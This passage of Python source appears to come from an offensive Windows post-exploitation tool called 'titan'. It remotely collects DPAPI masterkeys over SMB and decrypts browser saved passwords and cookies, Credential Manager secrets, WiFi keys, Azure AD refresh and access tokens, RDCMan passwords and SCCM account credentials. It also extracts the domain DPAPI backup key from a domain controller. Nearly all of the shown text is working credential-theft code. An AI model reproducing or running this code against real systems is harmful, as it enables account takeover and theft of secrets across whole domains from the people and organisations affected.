        sid_dirs    = [e for e in ls(protect_unc) if e.startswith('S-1-5-')]
        user_mks    = []
        for sid in sid_dirs:
            result['user_sids'][username] = sid
            sid_unc = protect_unc + '\\' + sid
            for mk_name in ls(sid_unc):
                mk_name = mk_name.split('\\')[-1]
                if _GUID_RE.match(mk_name):
                    local = os.path.join(udir, 'protect', sid, mk_name)
                    if pull_file(sid_unc + '\\' + mk_name, local):
                        user_mks.append(local)
        if user_mks:
            result['user_mks'][username] = user_mks

        cred_paths = []
        for cred_sub in (r'\AppData\Roaming\Microsoft\Credentials',
                         r'\AppData\Local\Microsoft\Credentials'):
            for blob_name in ls(base + cred_sub):
                blob_name = blob_name.split('\\')[-1]
                if not blob_name or blob_name in ('.', '..'):
                    continue
                local = os.path.join(udir, 'creds', blob_name)
                if pull_file(base + cred_sub + '\\' + blob_name, local):
                    cred_paths.append(local)
        if cred_paths:
            result['credman'][username] = cred_paths

        for bkey, bbranch, bdir in [
            ('chrome', r'\AppData\Local\Google\Chrome\User Data',               'chrome'),
            ('edge',   r'\AppData\Local\Microsoft\Edge\User Data',               'edge'),
            ('brave',  r'\AppData\Local\BraveSoftware\Brave-Browser\User Data',  'brave'),
        ]:
            bbase = base + bbranch
            b_ls  = os.path.join(udir, bdir, 'Local_State')
            b_ld  = os.path.join(udir, bdir, 'Login_Data')
            ok_ls = pull_file(bbase + r'\Local State',        b_ls)
            ok_ld = pull_file(bbase + r'\Default\Login Data', b_ld)
            if ok_ls or ok_ld:
                result[bkey][username] = {
                    'local_state': b_ls if ok_ls else None,
                    'login_data':  b_ld if ok_ld else None,
                }
                for cookie_rel in (r'\Default\Network\Cookies', r'\Default\Cookies'):
                    b_ck = os.path.join(udir, bdir, 'Cookies')
                    if pull_file(bbase + cookie_rel, b_ck):
                        result[bkey][username]['cookies'] = b_ck
                        break

        packages_base = base + r'\AppData\Local\Packages'
        for pkg_entry in ls(packages_base):
            pkg_short = pkg_entry.split('\\')[-1]
            if not pkg_short.lower().startswith('microsoft.aad.brokerplugin'):
                continue
            tbres_dir = packages_base + '\\' + pkg_short + r'\AC\TokenBroker\Cache'
            user_wam  = result['wam_tokens'].setdefault(username, [])
            for tbres_entry in ls(tbres_dir):
                tbres_name = tbres_entry.split('\\')[-1]
                if not tbres_name.lower().endswith('.tbres'):
                    continue
                local_tbres = os.path.join(udir, 'wam', tbres_name)
                if pull_file(tbres_dir + '\\' + tbres_name, local_tbres):
                    user_wam.append(local_tbres)

        for rdcman_rel in (
            r'\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings',
            r'\Documents\RDCMan.settings',
        ):
            local_rdcman = os.path.join(udir, 'rdcman', 'RDCMan.settings')
            if pull_file(base + rdcman_rel, local_rdcman):
                result['rdcman'][username] = local_rdcman
                break

    return result


# ── DPAPI: Chrome / Edge decryption ──────────────────────────────────────────

_CHROME_KEY_RESULT_DPAPI = 'dpapi'
_CHROME_KEY_RESULT_APPB  = 'appb'
_CHROME_KEY_RESULT_NONE  = 'none'


def _chrome_aes_key(local_state_path: str, masterkeys: dict) -> tuple:
    """Return (aes_key_bytes_or_None, key_type_str).

    key_type_str is one of:
      'dpapi'   — classic DPAPI-wrapped key, decrypted successfully
      'appb'    — Chrome 127+ App-Bound Key (machine DPAPI), decrypted successfully
      'appb_no_mk' — APPB but machine masterkeys unavailable / decrypt failed
      'dpapi_no_mk' — DPAPI but user masterkey unavailable / decrypt failed
      'none'    — Local State missing or no encrypted_key field
    """
    if not local_state_path or not os.path.isfile(local_state_path):
        return None, _CHROME_KEY_RESULT_NONE
    try:
        with open(local_state_path, 'r', encoding='utf-8', errors='replace') as f:
            ls = json.load(f)
        b64 = ls.get('os_crypt', {}).get('encrypted_key', '')
        if not b64:
            return None, _CHROME_KEY_RESULT_NONE
        raw = base64.b64decode(b64)

        if raw.startswith(b'DPAPI'):
            plain = _blob_decrypt(raw[5:], masterkeys)
            if plain and len(plain) >= 32:
                return plain[:32], _CHROME_KEY_RESULT_DPAPI
            return None, 'dpapi_no_mk'

        if raw.startswith(b'APPB'):
            # Chrome 127+ App-Bound Encryption: machine-context CryptProtectData
            # (CRYPTPROTECT_LOCAL_MACHINE) wraps the 32-byte AES-256 browser key.
            # We already hold machine masterkeys from DPAPI_SYSTEM — decrypt offline.
            plain = _blob_decrypt(raw[4:], masterkeys)
            if plain and len(plain) >= 32:
                return plain[-32:], _CHROME_KEY_RESULT_APPB
            return None, 'appb_no_mk'

        return None, _CHROME_KEY_RESULT_NONE
    except Exception:
        return None, _CHROME_KEY_RESULT_NONE


def _chrome_decrypt_value(enc: bytes, aes_key: bytes, masterkeys: dict) -> str:
    if enc[:3] in (b'v10', b'v11') and aes_key:
        try:
            return AESGCM(aes_key).decrypt(enc[3:15], enc[15:], None).decode('utf-8', errors='replace')
        except Exception:
            pass
    plain = _blob_decrypt(enc, masterkeys)
    return plain.decode('utf-8', errors='replace').rstrip('\x00') if plain else None


# ── DPAPI: SCCM Network Access Account ───────────────────────────────────────

def _dump_sccm_naa(host: str, auth: list, masterkeys: dict, out: list, verbose: bool = False):
    """Extract SCCM/MECM Network Access Account credentials from WMI."""
    import re as _re

    if not WMI_BIN or not os.path.exists(WMI_BIN):
        return

    server_name = host
    raw_cn = _reg('list', auth, host,
                  ['HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName',
                   '-IncludeData'], verbose)
    for line in raw_cn.splitlines():
        parts = line.split()
        if len(parts) >= 4 and parts[0] == 'ComputerName' and parts[1] == 'Value':
            server_name = parts[3]
            break

    wmi_auth = auth + (['-HostAddress', host] if server_name != host else [])

    for ns in ('root\\ccm\\Policy\\Machine\\ActualConfig',
               'root\\ccm\\Policy\\Machine\\RequestedConfig'):
        raw, rc = _run(
            WMI_BIN, 'query', wmi_auth,
            [server_name, 'SELECT NetworkAccessUsername, NetworkAccessPassword '
             'FROM CCM_NetworkAccessAccount',
             '-Namespace', ns, '-ConsoleOutputStyle', 'Json'],
            verbose, timeout=30)
        if rc != 0 or not raw.strip() or raw.strip() in ('[]', '[]]', '['):
            continue

        try:
            cleaned = raw.rstrip().rstrip(']') + ']'
            rows = json.loads(cleaned)
        except Exception:
            continue

        naa = {}
        for row in rows:
            for role, field in [('Username', 'NetworkAccessUsername'),
                                 ('Password', 'NetworkAccessPassword')]:
                xml_val = row.get(field, '')
                if not xml_val:
                    continue
                m = _re.search(r'<!\[CDATA\[([0-9A-Fa-f]+)\]\]>', xml_val)
                if not m:
                    continue
                blob_bytes = bytes.fromhex(m.group(1))
                for offset in (4, 0):
                    plain = _blob_decrypt(blob_bytes[offset:], masterkeys)
                    if plain:
                        try:
                            val = plain.decode('utf-16-le', errors='replace').rstrip('\x00').strip()
                        except Exception:
                            val = plain.hex()
                        naa[role] = val or ''
                        break

        if naa:
            out.append('\n[*] SCCM Network Access Account')
            out.append('-' * 60)
            u = naa.get('Username', '')
            pw = naa.get('Password', '')
            if u or pw:
                out.append(f'  Username: {u}')
                out.append(f'  Password: {pw}')
            else:
                out.append('  (configured but credentials are blank)')

        # Collection variables — often contain deployment credentials
        raw_cv, rc_cv = _run(
            WMI_BIN, 'query', wmi_auth,
            [server_name,
             'SELECT CollectionVariableName, CollectionVariableValue FROM CCM_CollectionVariable',
             '-Namespace', ns, '-ConsoleOutputStyle', 'Json'],
            verbose, timeout=30)
        if rc_cv == 0 and raw_cv.strip() not in ('', '[]', '[]]', '['):
            try:
                cleaned = raw_cv.rstrip().rstrip(']') + ']'
                cv_rows = json.loads(cleaned)
                if cv_rows:
                    out.append('\n[*] SCCM Collection Variables')
                    out.append('-' * 60)
                    for row in cv_rows:
                        name = (row.get('CollectionVariableName', '') or '').strip()
                        val  = (row.get('CollectionVariableValue', '') or '').strip()
                        if name:
                            out.append(f'  {name}: {val}')
            except Exception:
                pass

        # TS environment variables
        raw_ts, rc_ts = _run(
            WMI_BIN, 'query', wmi_auth,
            [server_name,
             'SELECT TSEnvironmentVariableName, TSEnvironmentVariableValue '
             'FROM CCM_TSEnvironmentVariable',
             '-Namespace', ns, '-ConsoleOutputStyle', 'Json'],
            verbose, timeout=30)
        if rc_ts == 0 and raw_ts.strip() not in ('', '[]', '[]]', '['):
            try:
                cleaned = raw_ts.rstrip().rstrip(']') + ']'
                ts_rows = json.loads(cleaned)
                if ts_rows:
                    out.append('\n[*] SCCM Task Sequence Variables')
                    out.append('-' * 60)
                    for row in ts_rows:
                        name = (row.get('TSEnvironmentVariableName', '') or '').strip()
                        val  = (row.get('TSEnvironmentVariableValue', '') or '').strip()
                        if name:
                            out.append(f'  {name}: {val}')
            except Exception:
                pass
        return


# ── Task Scheduler run-as credential visibility ───────────────────────────────

def _dump_task_scheduler(host: str, auth: list, workdir: str, out: list,
                         verbose: bool = False):
    """Pull task XMLs via SMB, report tasks with stored run-as credentials.

    Passwords are NOT separately encrypted here — they land in LSA secrets
    (_SC_ entries, already dumped by --lsa) or in Credential Manager blobs
    (already decrypted by --dpapi).  This function shows the task-to-account
    mapping so the operator knows which LSA/CredMan entry belongs to what task.
    """
    import xml.etree.ElementTree as ET

    tasks_unc  = rf'\\{host}\C$\Windows\System32\Tasks'
    local_root = os.path.join(workdir, 'tasks')
    os.makedirs(local_root, exist_ok=True)

    # Recursive listing: walk up to 6 levels deep (tasks nest by folder path)
    def _ls_r(unc: str, depth: int = 0) -> list[str]:
        if depth > 6:
            return []
        entries = _smb_ls(unc, auth, 0, verbose)
        files   = []
        for e in entries:
            name = e.split('\\')[-1]
            if not name or name in ('.', '..'):
                continue
            child = unc + '\\' + name
            # Task XML files have no extension on disk
            if '.' not in name:
                # Could be a folder or a task file — pull and try to parse
                files.append(child)
            else:
                # Folders that look like task category dirs
                files.extend(_ls_r(child, depth + 1))
        return files

    all_paths = _ls_r(tasks_unc)

    # NS used in task XML files
    _NS = '{http://schemas.microsoft.com/windows/2004/02/mit/task}'

    interesting = []  # list of (task_name, run_as_user, logon_type)

    for remote_path in all_paths:
        task_name = remote_path.replace(tasks_unc, '').lstrip('\\')
        local     = os.path.join(local_root, task_name.replace('\\', '_'))
        if not _smb_pull_file(remote_path, local, auth, verbose):
            continue
        try:
            data = open(local, 'rb').read()
            # Task files are UTF-16-LE with BOM or UTF-8
            try:
                text = data.decode('utf-16-le')
                if text.startswith('\ufeff'):
                    text = text[1:]
            except UnicodeDecodeError:
                text = data.decode('utf-8', errors='replace')

            root = ET.fromstring(text)
            # Look under Principals/Principal
            for principal in root.iter(f'{_NS}Principal'):
                uid_el     = principal.find(f'{_NS}UserId')
                logon_el   = principal.find(f'{_NS}LogonType')
                uid        = (uid_el.text   or '').strip() if uid_el   is not None else ''
                logon_type = (logon_el.text or '').strip() if logon_el is not None else ''

                # Skip SYSTEM / built-in service accounts
                skip = {'SYSTEM', 'NT AUTHORITY\\SYSTEM', 'NT AUTHORITY\\LOCALSERVICE',
                        'NT AUTHORITY\\NETWORKSERVICE', 'S-1-5-18', 'S-1-5-19', 'S-1-5-20',
                        'LOCAL SERVICE', 'NETWORK SERVICE', ''}
                if uid.upper() in {s.upper() for s in skip}:
                    continue
                # InteractiveToken = no stored password; Password/S4U = stored
                if logon_type.lower() not in ('password', 's4u', ''):
                    continue
                interesting.append((task_name, uid, logon_type or 'unknown'))
        except Exception:
            pass

    if not interesting:
        return

    out.append('\n[*] Scheduled Task Run-As Credentials')
    out.append('-' * 60)
    out.append('    Passwords in LSA secrets (_SC_<task>) or Credential Manager blobs above')
    for task_name, uid, logon_type in sorted(interesting):
        out.append(f'  Task:      {task_name}')
        out.append(f'  RunAs:     {uid}')
        out.append(f'  LogonType: {logon_type}')
        out.append('')


# ── DPAPI: Browser passwords ──────────────────────────────────────────────────

_KEY_FAIL_HINT = {
    'dpapi_no_mk':  'user masterkey not decrypted — run: titan dump --backupkey -t <DC>, '
                    'then --dpapi-backupkey <pem> on this target',
    'appb_no_mk':   'Chrome 127+ App-Bound Key — machine masterkey unavailable; '
                    'ensure DPAPI_SYSTEM was dumped (SAM+LSA first, then --dpapi)',
    'none':         'Local State missing or no encrypted_key field',
}


def _dump_browser_passwords(browser_files: dict, masterkeys: dict, browser: str, out: list):
    header_printed = False
    for username, info in browser_files.items():
        aes_key, key_type = _chrome_aes_key(info.get('local_state'), masterkeys)
        login_data = info.get('login_data')
        if not login_data or not os.path.isfile(login_data):
            continue
        tmp = login_data + '.tmp'
        try:
            shutil.copy2(login_data, tmp)
            conn = sqlite3.connect(tmp)
            rows = conn.execute(
                'SELECT origin_url, username_value, password_value FROM logins'
            ).fetchall()
            conn.close()
        except Exception:
            continue
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass

        creds = []
        for url, uname, enc_pw in rows:
            if not enc_pw:
                continue
            pw = _chrome_decrypt_value(bytes(enc_pw), aes_key, masterkeys)
            if pw is None and key_type in _KEY_FAIL_HINT:
                pw = f'[encrypted — {_KEY_FAIL_HINT[key_type]}]'
            elif pw is None:
                pw = '[encrypted — masterkey missing]'
            creds.append((url, uname, pw))

        if creds:
            if not header_printed:
                out.append(f'\n[*] {browser} Saved Passwords')
                out.append('-' * 60)
                header_printed = True
            key_tag = f'  [key: {key_type}]' if key_type else ''
            out.append(f'\n  User profile: {username}{key_tag}')
            for url, uname, pw in creds:
                out.append(f'  URL:      {url}')
                out.append(f'  Username: {uname}')
                out.append(f'  Password: {pw}')


# ── DPAPI: Browser cookies ───────────────────────────────────────────────────

def _dump_browser_cookies(browser_files: dict, masterkeys: dict, browser: str, out: list):
    header_printed = False
    for username, info in browser_files.items():
        aes_key, key_type = _chrome_aes_key(info.get('local_state'), masterkeys)
        cookies_db = info.get('cookies')
        if not cookies_db or not os.path.isfile(cookies_db):
            continue
        tmp = cookies_db + '.tmp'
        try:
            shutil.copy2(cookies_db, tmp)
            conn = sqlite3.connect(tmp)
            rows = conn.execute(
                'SELECT host_key, name, encrypted_value, expires_utc '
                'FROM cookies WHERE encrypted_value IS NOT NULL'
            ).fetchall()
            conn.close()
        except Exception:
            continue
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass

        creds = []
        encrypted_count = 0
        for host_key, name, enc_val, expires in rows:
            if not enc_val:
                continue
            val = _chrome_decrypt_value(bytes(enc_val), aes_key, masterkeys)
            if val:
                session = expires == 0
                creds.append((host_key, name, val, session))
            else:
                encrypted_count += 1

        if creds or encrypted_count:
            if not header_printed:
                out.append(f'\n[*] {browser} Cookies')
                out.append('-' * 60)
                header_printed = True
            key_tag = f'  [key: {key_type}]' if key_type else ''
            out.append(f'\n  User profile: {username}{key_tag}')
            if creds:
                out.append(f'  ({len(creds)} cookie(s) decrypted)')
                for host_key, name, val, session in creds:
                    sess_tag = '  [session]' if session else ''
                    out.append(f'  {host_key}  {name}={val[:120]}{"…" if len(val) > 120 else ""}{sess_tag}')
            if encrypted_count:
                hint = _KEY_FAIL_HINT.get(key_type, 'masterkey missing')
                out.append(f'  [{encrypted_count} cookie(s) encrypted — {hint}]')


# ── DPAPI: WiFi profiles ──────────────────────────────────────────────────────

def _dump_wifi_profiles(wifi_files: list, masterkeys: dict, out: list):
    """Decrypt WiFi profile XML files pulled via Smb2Client."""
    import xml.etree.ElementTree as ET
    header_printed = False
    for path in wifi_files:
        try:
            with open(path, 'rb') as f:
                data = f.read()
            root = ET.fromstring(data)
        except Exception:
            continue

        # Strip XML namespace for simpler XPath
        for elem in root.iter():
            if '}' in elem.tag:
                elem.tag = elem.tag.split('}', 1)[1]

        ssid_node = root.find('.//SSID/name')
        ssid = ssid_node.text.strip() if ssid_node is not None else os.path.basename(path).replace('.xml', '')
        auth_node = root.find('.//authentication')
        auth_type = auth_node.text.strip() if auth_node is not None else 'unknown'

        if not header_printed:
            out.append('\n[*] WiFi Profile Credentials')
            out.append('-' * 60)
            header_printed = True
        out.append(f'\n  SSID: {ssid}  [{auth_type}]')

        protected_node = root.find('.//sharedKey/protected')
        key_node       = root.find('.//sharedKey/keyMaterial')
        if protected_node is not None and key_node is not None:
            protected = (protected_node.text or '').strip().lower() == 'true'
            key_hex   = (key_node.text or '').strip()
            if protected and key_hex:
                try:
                    plain = _blob_decrypt(bytes.fromhex(key_hex), masterkeys)
                    if plain:
                        try:
                            psk = plain.decode('utf-16-le', errors='replace').rstrip('\x00').strip()
                        except Exception:
                            psk = plain.decode('utf-8', errors='replace').rstrip('\x00').strip()
                        out.append(f'  PSK:  {psk}')
                    else:
                        out.append('  PSK:  [encrypted — machine masterkey unavailable]')
                except Exception as e:
                    out.append(f'  PSK:  [parse error: {e}]')
            elif not protected and key_hex:
                out.append(f'  PSK:  {key_hex}  (plaintext)')


# ── DPAPI: WAM / Azure AD token broker ───────────────────────────────────────

_DPAPI_PROVIDER_BYTES = bytes.fromhex('D08C9DDF011511D18C7A00C04FC297EB')


def _parse_tbres(data: bytes, masterkeys: dict) -> dict:
    """Extract Azure AD tokens from a WAM .tbres file via DPAPI blob scan."""
    idx = data.find(_DPAPI_PROVIDER_BYTES)
    if idx < 8:
        return None
    # Back up over cbHeader(4) + dwVersion(4) which precede the provider GUID
    blob_start = idx - 8
    plain = _blob_decrypt(data[blob_start:], masterkeys)
    if not plain:
        return None
    json_start = plain.find(b'{')
    if json_start < 0:
        return None
    try:
        return json.loads(plain[json_start:].decode('utf-8', errors='replace'))
    except Exception:
        return None


def _dump_wam_tokens(wam_files: dict, masterkeys: dict, out: list):
    header_printed = False
    for username, paths in wam_files.items():
        for path in paths:
            try:
                data = open(path, 'rb').read()
            except Exception:
                continue
            tok = _parse_tbres(data, masterkeys)
            if not tok:
                continue
            if not header_printed:
                out.append('\n[*] Azure AD / WAM Tokens (TBRES)')
                out.append('-' * 60)
                header_printed = True
            account    = tok.get('account', {}) or {}
            user_id    = (account.get('username') or tok.get('username') or
                          tok.get('preferred_username', ''))
            home_id    = account.get('home_account_id', '') or ''
            tenant     = home_id.split('.')[1] if '.' in home_id else tok.get('tenant_id', '')
            access_tok = tok.get('access_token', '') or tok.get('secret', '')
            refresh_tok = tok.get('refresh_token', '')
            out.append(f'\n  User profile: {username}')
            if user_id:   out.append(f'  Account:      {user_id}')
            if tenant:    out.append(f'  Tenant:       {tenant}')
            if refresh_tok:
                out.append(f'  RefreshToken: {refresh_tok[:100]}{"…" if len(refresh_tok) > 100 else ""}')
            if access_tok:
                out.append(f'  AccessToken:  {access_tok[:100]}{"…" if len(access_tok) > 100 else ""}')


# ── DPAPI: RDCMan saved credentials ──────────────────────────────────────────

def _dump_rdcman(rdcman_files: dict, masterkeys: dict, out: list):
    import xml.etree.ElementTree as ET
    header_printed = False
    for username, path in rdcman_files.items():
        try:
            with open(path, 'rb') as f:
                data = f.read()
            root = ET.fromstring(data)
        except Exception:
            continue

        creds = []
        for cred_elem in root.iter('logonCredentials'):
            pw_elem  = cred_elem.find('.//password')
            usr_elem = cred_elem.find('.//username')
            dom_elem = cred_elem.find('.//domain')
            if pw_elem is None or not pw_elem.text:
                continue
            try:
                blob  = base64.b64decode(pw_elem.text.strip())
                plain = _blob_decrypt(blob, masterkeys)
                if plain:
                    try:
                        pw = plain.decode('utf-16-le', errors='replace').rstrip('\x00')
                    except Exception:
                        pw = plain.decode('utf-8', errors='replace').rstrip('\x00')
                    dom  = (dom_elem.text  or '').strip() if dom_elem  is not None else ''
                    user = (usr_elem.text  or '').strip() if usr_elem  is not None else ''
                    creds.append((dom, user, pw))
            except Exception:
                continue

        if creds:
            if not header_printed:
                out.append('\n[*] RDCMan Saved Credentials')
                out.append('-' * 60)
                header_printed = True
            out.append(f'\n  User profile: {username}')
            for dom, user, pw in creds:
                prefix = f'{dom}\\' if dom else ''
                out.append(f'  Account:  {prefix}{user}')
                out.append(f'  Password: {pw}')


# ── DPAPI: Credential Manager ─────────────────────────────────────────────────

def _parse_credman_struct(data: bytes) -> dict:
    """Parse a decrypted Windows CREDENTIAL binary structure."""
    try:
        pos = 0
        ordered = []
        while pos < len(data) - 1:
            lo, hi = data[pos], data[pos + 1]
            if 0x20 <= lo <= 0x7e and hi == 0:
                start = pos
                chars = []
                while pos < len(data) - 1 and 0x20 <= data[pos] <= 0x7e and data[pos + 1] == 0:
                    chars.append(chr(data[pos]))
                    pos += 2
                if len(chars) >= 2:
                    ordered.append((start, ''.join(chars)))
            else:
                pos += 1
        if not ordered:
            return None
        target   = ordered[0][1] if len(ordered) > 0 else ''
        username = ordered[1][1] if len(ordered) > 1 else ''
        secret   = ordered[2][1] if len(ordered) > 2 else '[binary]'
        return {'target': target, 'username': username, 'secret': secret}
    except Exception:
        return None


def _credman_blob_decrypt(raw: bytes, masterkeys: dict):
    for blob in (raw[12:], raw):
        plain = _blob_decrypt(blob, masterkeys)
        if plain:
            return plain
    return None


def _is_internal_token(cred: dict) -> bool:
    target = cred.get('target', '')
    user   = cred.get('username', '')
    if 'virtualapp/didlogical' in target and user == 'PersistedCredential':
        return True
    if not target and not user:
        return True
    return False


def _dump_credman(credman_files: dict, masterkeys: dict, out: list):
    header_printed = False
    for profile_label, paths in credman_files.items():
        for path in paths:
            try:
                raw = open(path, 'rb').read()
            except Exception:
                continue
            plain = _credman_blob_decrypt(raw, masterkeys)
            if not plain:
                continue
            cred = _parse_credman_struct(plain)
            if not cred or _is_internal_token(cred):
                continue
            if not header_printed:
                out.append('\n[*] Windows Credential Manager')
                out.append('-' * 60)
                header_printed = True
            out.append(f'\n  [{profile_label}]')
            out.append(f'  Target:   {cred["target"]}')
            out.append(f'  Username: {cred["username"]}')
            out.append(f'  Password: {cred["secret"]}')


# ── DPAPI: Domain backup key ──────────────────────────────────────────────────

def _dump_backupkey(host: str, args, auth: list, out: list):
    """Extract domain DPAPI backup key from DC via LSARPC, save as PEM."""
    try:
        from impacket.dcerpc.v5 import transport as _transport, lsad as _lsad
        from impacket import crypto as _impcrypto
        from impacket.dpapi import PREFERRED_BACKUP_KEY as _PBKEY
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
        from cryptography.hazmat.primitives.serialization import (
            Encoding, PrivateFormat, NoEncryption)
        import struct, uuid
    except ImportError as e:
        out.append(f'[!] --backupkey requires impacket: {e}')
        return

    out.append(f'\n[*] Extracting DPAPI domain backup key from {host}')

    username = auth[auth.index('-UserName') + 1]
    domain   = auth[auth.index('-UserDomain') + 1] if '-UserDomain' in auth else ''
    password = auth[auth.index('-Password') + 1]   if '-Password'  in auth else ''
    nt_hash  = auth[auth.index('-NtlmHash') + 1]   if '-NtlmHash'  in auth else ''
    lm_hash  = 'aad3b435b51404eeaad3b435b51404ee'

    try:
        rpc = _transport.SMBTransport(
            host, 445, r'\lsarpc',
            username=username, password=password,
            domain=domain,
            lmhash=lm_hash if nt_hash else '',
            nthash=nt_hash)
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(_lsad.MSRPC_UUID_LSAD)
        session_key = rpc.get_smb_connection().getSessionKey()

        resp   = _lsad.hLsarOpenPolicy2(dce)
        policy = resp['PolicyHandle']

        pref_enc   = _lsad.hLsarRetrievePrivateData(dce, policy, 'G$BCKUPKEY_PREFERRED')
        pref_plain = _impcrypto.decryptSecret(session_key, pref_enc)

        d1, d2, d3 = struct.unpack_from('<IHH', pref_plain[:8])
        d4 = pref_plain[8:16]
        guid = (f'{d1:08X}-{d2:04X}-{d3:04X}-'
                f'{d4[:2].hex().upper()}-{d4[2:].hex().upper()}')
        out.append(f'[*] Preferred backup key GUID: {guid}')

        key_enc   = _lsad.hLsarRetrievePrivateData(dce, policy, f'G$BCKUPKEY_{guid}')
        key_plain = _impcrypto.decryptSecret(session_key, key_enc)

        _lsad.hLsarClose(dce, policy)
        dce.disconnect()

        pbk = _PBKEY(key_plain)
        buf = bytes(pbk['Data'])[:pbk['KeyLength']]

        bitlen = struct.unpack_from('<I', buf, 12)[0]
        pubexp = struct.unpack_from('<I', buf, 16)[0]
        n, h   = bitlen // 8, bitlen // 16
        off    = 20

        def _lei(b, o, s): return int.from_bytes(b[o:o+s], 'little')

        modulus     = _lei(buf, off, n);  off += n
        prime1      = _lei(buf, off, h);  off += h
        prime2      = _lei(buf, off, h);  off += h
        exp1        = _lei(buf, off, h);  off += h
        exp2        = _lei(buf, off, h);  off += h
        coefficient = _lei(buf, off, h);  off += h
        privexp     = _lei(buf, off, n)

        pub  = RSAPublicNumbers(pubexp, modulus)
        priv = RSAPrivateNumbers(prime1, prime2, privexp, exp1, exp2, coefficient, pub)
        rsa_key = priv.private_key(default_backend())
        pem = rsa_key.private_bytes(Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption())

        out_path = getattr(args, 'backupkey_out', None) or \
                   os.path.join(args.output_dir or '.', f'{host}_dpapi_bk.pem')
        with open(out_path, 'wb') as fh:
            fh.write(pem)

        out.append(f'[+] RSA {bitlen}-bit domain backup key saved → {out_path}')
        out.append(f'    Use: titan dump --dpapi --dpapi-backupkey {out_path} -t <target>')

    except Exception as e:
        out.append(f'[!] Backup key extraction failed: {e}')


# ── DPAPI: helpers ────────────────────────────────────────────────────────────

def _fetch_dpapi_system(host: str, auth: list, verbose: bool) -> str:
    raw = _reg('dumplsasecrets', auth, host,
               ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'], verbose)
    for row in csv.DictReader(io.StringIO(raw)):
        if row.get('Name', '').strip() == 'DPAPI_SYSTEM':
            return (row.get('CurrentValueHex', '') or '').strip()
    return None


def _fetch_sam_nt_hashes(host: str, auth: list, verbose: bool) -> dict:
    raw = _reg('dumpsam', auth, host,
               ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'], verbose)
    hashes = {}
    for row in csv.DictReader(io.StringIO(raw)):
        user = row.get('AccountName', '').strip().lower()
        nt   = (row.get('NtlmHashText', '') or EMPTY_NT).strip()
        if user:
            hashes[user] = nt
    return hashes


# ── DPAPI: orchestration ──────────────────────────────────────────────────────

def _dump_dpapi(host: str, args, auth: list, dpapi_system_hex: str,
                sam_hashes: dict, out: list, verbose: bool = False):
    """Full DPAPI credential dump."""
    if not SMB_BIN or not os.path.exists(SMB_BIN):
        out.append('\n[!] Smb2Client binary not found — skipping DPAPI dump')
        return

    out.append(f'\n[*] DPAPI Credential Dump ({host})')
    out.append('=' * 60)

    if not dpapi_system_hex:
        dpapi_system_hex = _fetch_dpapi_system(host, auth, verbose)

    machine_key = None
    user_key    = None
    if dpapi_system_hex and len(dpapi_system_hex) >= 88:
        blob = bytes.fromhex(dpapi_system_hex)
        machine_key = blob[4:24]
        user_key    = blob[24:44]
        out.append(f'[*] DPAPI_SYSTEM machine key : {machine_key.hex()}')
        out.append(f'[*] DPAPI_SYSTEM user key    : {user_key.hex()}')

    bk_pem  = None
    bk_path = getattr(args, 'dpapi_backupkey', None)
    if bk_path:
        try:
            with open(bk_path, 'rb') as f:
                bk_pem = f.read()
            out.append(f'[*] Domain backup key loaded: {bk_path}')
        except Exception as e:
            out.append(f'[!] Could not load backup key {bk_path}: {e}')

    print(f'[*] Collecting DPAPI files for {host} — grab a coffee, this takes a moment...',
          file=sys.stderr, flush=True)
    out.append(f'[*] Collecting DPAPI files for {host} — grab a coffee...')
    workdir = tempfile.mkdtemp(prefix='titan_dpapi_')

    try:
        files = _collect_dpapi_files(host, auth, workdir, verbose)

        n_sys  = len(files['sys_mks_root']) + len(files['sys_mks_user'])
        n_user = sum(len(v) for v in files['user_mks'].values())
        n_cred = sum(len(v) for v in files['credman'].values())

        if n_sys == 0 and n_user == 0 and n_cred == 0:
            probe, probe_rc = _smb('ls', auth,
                                   [rf'\\{host}\C$\Windows\System32',
                                    '-Depth', '0', '-ConsoleOutputStyle', 'Json'],
                                   False, 20)
            if probe_rc != 0 or 'LOGON_FAILURE' in probe or 'ACCESS_DENIED' in probe:
                out.append('[!] Authentication failed or access denied — verify credentials')

        out.append(f'[*] Found: {n_sys} system MK, {n_user} user MK, '
                   f'{n_cred} credman blob(s), '
                   f'{len(files["chrome"])} Chrome / {len(files["edge"])} Edge / '
                   f'{len(files["brave"])} Brave profile(s), '
                   f'{len(files["wifi_profiles"])} WiFi profile(s), '
                   f'{len(files["wam_tokens"])} WAM token cache(s), '
                   f'{len(files["rdcman"])} RDCMan config(s)')

        masterkeys = {}

        def _try_mk(mkf_path, key, label_key):
            data = open(mkf_path, 'rb').read()
            guid, mk = _mk_decrypt_file(data, key)
            if guid and mk:
                masterkeys[guid] = mk
                return True
            return False

        if machine_key and files['sys_mks_root'] and not getattr(args, 'dpapi_no_system', False):
            dec = sum(_try_mk(p, machine_key, 'machine') for p in files['sys_mks_root'])
            out.append(f'[*] System root MKs decrypted: {dec}/{len(files["sys_mks_root"])}')

        if user_key and files['sys_mks_user'] and not getattr(args, 'dpapi_no_system', False):
            dec = sum(_try_mk(p, user_key, 'user') for p in files['sys_mks_user'])
            out.append(f'[*] System\\User MKs decrypted: {dec}/{len(files["sys_mks_user"])}')

        if bk_pem and files['user_mks']:
            decrypted = 0
            for username, mkfs in files['user_mks'].items():
                for mkf_path in mkfs:
                    try:
                        data = open(mkf_path, 'rb').read()
                        from impacket.dpapi import MasterKeyFile as _MKF2
                        mkf_obj = _MKF2(data)
                        mk_len  = mkf_obj['DomainKeyLen']
                        if mk_len == 0:
                            continue
                        from impacket.dpapi import DomainKey as _DK
                        from cryptography.hazmat.primitives.serialization import (
                            load_pem_private_key, load_der_private_key)
                        from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
                        offset = (len(mkf_obj) + mkf_obj['MasterKeyLen'] +
                                  mkf_obj['BackupKeyLen'] + mkf_obj['CredHistLen'])
                        dk_data = data[offset:offset + mk_len]
                        dk = _DK(dk_data)
                        try:
                            privkey = load_pem_private_key(bk_pem, password=None,
                                                           backend=default_backend())
                        except Exception:
                            privkey = load_der_private_key(bk_pem, password=None,
